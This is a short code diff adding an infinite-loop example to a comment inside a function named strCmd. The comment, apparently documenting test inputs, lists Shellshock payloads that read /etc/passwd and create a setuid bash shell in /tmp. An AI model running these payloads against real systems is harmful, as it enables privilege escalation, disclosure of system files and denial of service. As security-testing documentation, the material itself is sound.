@@ -121,6 +121,9 @@ function strCmd($test)
 () { :; }; /bin/cat /etc/passwd
 * [ Setuid shell ]
 () { :; }; cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
+
+or send an infite loop
+for (( ;; )) do echo tmp; done
 */
 
 /******************************************
